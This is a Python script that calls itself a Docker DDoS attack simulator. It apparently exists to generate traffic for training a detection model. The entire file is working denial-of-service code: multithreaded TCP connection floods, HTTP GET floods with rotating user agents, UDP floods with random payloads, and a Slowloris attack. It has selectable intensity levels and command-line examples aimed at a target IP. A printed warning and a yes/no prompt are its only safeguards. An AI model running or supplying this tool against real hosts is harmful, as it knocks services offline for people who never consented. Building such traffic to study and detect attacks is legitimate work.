#docker_ddos_attacker.py
"""
Realistic DDoS Attack Simulator for Docker
Generates traffic patterns matching real-world training data
"""

import socket
import threading
import time
import random
import argparse
import sys
from datetime import datetime


class RealisticDDoSAttacker:
    """
    Generates DDoS traffic patterns that match real training data:
    - Multiple attack types (SYN flood, HTTP flood, UDP flood)
    - Realistic packet rates and flow durations
    - Variable intensity levels
    """
    
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.threads = []
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'errors': 0,
            'start_time': None
        }
        self.lock = threading.Lock()
        
    def syn_flood(self, duration=120, intensity='medium'):
        """
        SYN Flood Attack
        Creates many incomplete TCP connections
        """
        print(f"\n{'='*70}")
        print(f"🔴 Starting SYN FLOOD Attack")
        print(f"   Target: {self.target_ip}:{self.target_port}")
        print(f"   Duration: {duration}s")
        print(f"   Intensity: {intensity.upper()}")
        print(f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Configure based on intensity
        if intensity == 'low':
            num_threads = 5
            delay_range = (0.1, 0.3)
        elif intensity == 'medium':
            num_threads = 15
            delay_range = (0.05, 0.15)
        else:  # high
            num_threads = 30
            delay_range = (0.01, 0.05)
        
        def worker():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.0)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    
                    # Random source port
                    source_port = random.randint(10000, 65000)
                    try:
                        sock.bind(('0.0.0.0', source_port))
                    except:
                        pass
                    
                    # Attempt connection (SYN packet)
                    try:
                        sock.connect((self.target_ip, self.target_port))
                        
                        with self.lock:
                            self.stats['connections_made'] += 1
                            self.stats['packets_sent'] += 3  # SYN, SYN-ACK, ACK
                        
                        # Keep connection briefly open
                        time.sleep(random.uniform(0.1, 0.5))
                    except (socket.timeout, ConnectionRefusedError, OSError):
                        with self.lock:
                            self.stats['packets_sent'] += 1  # SYN sent
                    
                except Exception as e:
                    with self.lock:
                        self.stats['errors'] += 1
                finally:
                    if sock:
                        try:
                            sock.close()
                        except:
                            pass
                
                # Variable delay between attempts
                time.sleep(random.uniform(*delay_range))
        
        print(f"✓ Launching {num_threads} attack threads...\n")
        for i in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
        
        self._monitor_attack(duration)
    
    def http_flood(self, duration=120, intensity='medium'):
        """
        HTTP Flood Attack
        Sends many HTTP requests to overwhelm the server
        """
        print(f"\n{'='*70}")
        print(f"🔴 Starting HTTP FLOOD Attack")
        print(f"   Target: {self.target_ip}:{self.target_port}")
        print(f"   Duration: {duration}s")
        print(f"   Intensity: {intensity.upper()}")
        print(f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        if intensity == 'low':
            num_threads = 5
            requests_per_conn = (5, 10)
        elif intensity == 'medium':
            num_threads = 15
            requests_per_conn = (10, 30)
        else:  # high
            num_threads = 30
            requests_per_conn = (20, 50)
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        def worker():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    sock.connect((self.target_ip, self.target_port))
                    
                    with self.lock:
                        self.stats['connections_made'] += 1
                    
                    num_requests = random.randint(*requests_per_conn)
                    
                    for _ in range(num_requests):
                        if not self.running:
                            break
                        
                        # Construct HTTP GET request
                        request = (
                            f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                            f"Host: {self.target_ip}\r\n"
                            f"User-Agent: {random.choice(user_agents)}\r\n"
                            f"Accept: */*\r\n"
                            f"Connection: keep-alive\r\n"
                            f"\r\n"
                        )
                        
                        try:
                            sock.send(request.encode())
                            with self.lock:
                                self.stats['packets_sent'] += 1
                            
                            # Small delay between requests
                            time.sleep(random.uniform(0.01, 0.1))
                        except:
                            break
                
                except Exception as e:
                    with self.lock:
                        self.stats['errors'] += 1
                finally:
                    if sock:
                        try:
                            sock.close()
                        except:
                            pass
                
                time.sleep(random.uniform(0.05, 0.2))
        
        print(f"✓ Launching {num_threads} attack threads...\n")
        for i in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
        
        self._monitor_attack(duration)
    
    def udp_flood(self, duration=120, intensity='medium'):
        """
        UDP Flood Attack
        Sends high volume of UDP packets
        """
        print(f"\n{'='*70}")
        print(f"🔴 Starting UDP FLOOD Attack")
        print(f"   Target: {self.target_ip}:{self.target_port}")
        print(f"   Duration: {duration}s")
        print(f"   Intensity: {intensity.upper()}")
        print(f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        if intensity == 'low':
            num_threads = 5
            packets_per_burst = (10, 30)
        elif intensity == 'medium':
            num_threads = 15
            packets_per_burst = (30, 100)
        else:  # high
            num_threads = 30
            packets_per_burst = (100, 300)
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    num_packets = random.randint(*packets_per_burst)
                    
                    for _ in range(num_packets):
                        if not self.running:
                            break
                        
                        # Random payload size (64-1400 bytes)
                        payload_size = random.randint(64, 1400)
                        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                        
                        try:
                            sock.sendto(payload, (self.target_ip, self.target_port))
                            with self.lock:
                                self.stats['packets_sent'] += 1
                        except:
                            with self.lock:
                                self.stats['errors'] += 1
                    
                    # Burst delay
                    time.sleep(random.uniform(0.1, 0.5))
                
                except Exception as e:
                    with self.lock:
                        self.stats['errors'] += 1
            
            sock.close()
        
        print(f"✓ Launching {num_threads} attack threads...\n")
        for i in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
        
        self._monitor_attack(duration)
    
    def slowloris(self, duration=120, num_connections=20):
        """
        Slowloris Attack
        Keeps many connections open by sending partial HTTP headers slowly
        """
        print(f"\n{'='*70}")
        print(f"🔴 Starting SLOWLORIS Attack")
        print(f"   Target: {self.target_ip}:{self.target_port}")
        print(f"   Duration: {duration}s")
        print(f"   Connections: {num_connections}")
        print(f"{'='*70}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def worker(worker_id):
            connection_start = time.time()
            sock = None
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10.0)
                sock.connect((self.target_ip, self.target_port))
                
                with self.lock:
                    self.stats['connections_made'] += 1
                    self.stats['packets_sent'] += 3
                
                # Send initial HTTP header
                header = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n"
                sock.send(header.encode())
                
                with self.lock:
                    self.stats['packets_sent'] += 1
                
                # Keep connection alive with slow headers
                while self.running and (time.time() - self.stats['start_time']) < duration:
                    time.sleep(random.uniform(5, 15))  # Slow send rate
                    
                    if not self.running:
                        break
                    
                    try:
                        header_part = f"X-Custom-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n"
                        sock.send(header_part.encode())
                        
                        with self.lock:
                            self.stats['packets_sent'] += 1
                    except:
                        break
            
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
        
        print(f"✓ Establishing {num_connections} slow connections...\n")
        for i in range(num_connections):
            t = threading.Thread(target=lambda: worker(i), daemon=True)
            t.start()
            self.threads.append(t)
            time.sleep(0.1)
        
        self._monitor_attack(duration)
    
    def _monitor_attack(self, duration):
        """Monitor and display attack statistics"""
        start_time = self.stats['start_time']
        
        try:
            while self.running and (time.time() - start_time) < duration:
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                
                with self.lock:
                    packets = self.stats['packets_sent']
                    connections = self.stats['connections_made']
                    errors = self.stats['errors']
                    pps = packets / elapsed if elapsed > 0 else 0
                
                print(f"\r📊 Time: {elapsed:.0f}s/{duration}s | "
                      f"Packets: {packets:,} | "
                      f"PPS: {pps:.1f} | "
                      f"Conns: {connections:,} | "
                      f"Errors: {errors:,} | "
                      f"Remaining: {remaining:.0f}s",
                      end="", flush=True)
                
                time.sleep(1.0)
        
        except KeyboardInterrupt:
            print("\n\n⚠️ Attack stopped manually")
        
        self.stop()
        self._print_summary(time.time() - start_time)
    
    def _print_summary(self, duration):
        """Print attack summary"""
        print(f"\n\n{'='*70}")
        print(f"✓ Attack Completed!")
        print(f"  Duration: {duration:.1f}s")
        print(f"  Total Packets: {self.stats['packets_sent']:,}")
        print(f"  Total Connections: {self.stats['connections_made']:,}")
        print(f"  Average PPS: {self.stats['packets_sent'] / duration:.1f}")
        print(f"  Errors: {self.stats['errors']:,}")
        print(f"{'='*70}\n")
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        for t in self.threads:
            t.join(timeout=2)
        self.threads = []


def main():
    parser = argparse.ArgumentParser(
        description='Docker DDoS Attack Simulator - Realistic Traffic Generation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SYN flood attack
  python docker_ddos_attacker.py --target 192.168.1.100 --type syn --duration 120 --intensity medium
  
  # HTTP flood attack
  python docker_ddos_attacker.py --target 192.168.1.100 --type http --port 8050 --duration 180 --intensity high
  
  # UDP flood attack
  python docker_ddos_attacker.py --target 192.168.1.100 --type udp --duration 90 --intensity low
  
  # Slowloris attack
  python docker_ddos_attacker.py --target 192.168.1.100 --type slowloris --connections 30 --duration 150
        """
    )
    
    parser.add_argument('--target', '-t', required=True,
                        help='Target IP address (your Windows 11 laptop IP)')
    parser.add_argument('--port', '-p', type=int, default=8050,
                        help='Target port (default: 8050)')
    parser.add_argument('--type', choices=['syn', 'http', 'udp', 'slowloris'], default='http',
                        help='Attack type (default: http)')
    parser.add_argument('--duration', '-d', type=int, default=120,
                        help='Attack duration in seconds (default: 120)')
    parser.add_argument('--intensity', '-i', choices=['low', 'medium', 'high'], default='medium',
                        help='Attack intensity (default: medium)')
    parser.add_argument('--connections', '-c', type=int, default=20,
                        help='Number of connections for slowloris (default: 20)')
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("🔴 DOCKER DDOS ATTACK SIMULATOR")
    print("="*70)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack Type: {args.type.upper()}")
    print(f"Duration: {args.duration}s")
    
    if args.type != 'slowloris':
        print(f"Intensity: {args.intensity.upper()}")
    else:
        print(f"Connections: {args.connections}")
    
    print("="*70)
    print("\n⚠️  WARNING: Use only against your own systems!")
    print("⚠️  Attacking unauthorized systems is illegal!\n")
    
    # Confirmation
    response = input("Proceed with attack? (yes/no): ")
    if response.lower() != 'yes':
        print("Attack cancelled.")
        sys.exit(0)
    
    attacker = RealisticDDoSAttacker(args.target, args.port)
    
    try:
        if args.type == 'syn':
            attacker.syn_flood(args.duration, args.intensity)
        elif args.type == 'http':
            attacker.http_flood(args.duration, args.intensity)
        elif args.type == 'udp':
            attacker.udp_flood(args.duration, args.intensity)
        elif args.type == 'slowloris':
            attacker.slowloris(args.duration, args.connections)
    except KeyboardInterrupt:
        print("\n\nStopping attack...")
        attacker.stop()
        print("Attack stopped.")


if __name__ == "__main__":
    main()